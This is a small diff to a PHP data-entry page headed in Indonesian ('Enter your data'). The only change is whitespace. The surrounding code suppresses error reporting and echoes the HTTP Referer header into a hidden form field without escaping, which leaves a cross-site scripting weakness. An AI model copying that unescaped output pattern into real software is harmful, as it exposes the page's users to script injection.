@@ -50,7 +50,7 @@ error_reporting(0);
 			<div class="column" style="margin-top: 3%">
 				<div style="position:relative; overflow: show">
 					<img src="header.png" />
-					<br /><br />
+					<br /> <br />
 					<h6 style="color:#777; font-weight:bold;">Masukkan Data Anda:</h6>
 					<form action="./submit.php" method="post">
 						<input type="hidden" name="origin" value="<?php echo $_SERVER['HTTP_REFERER'];?>" autocomplete="off" />
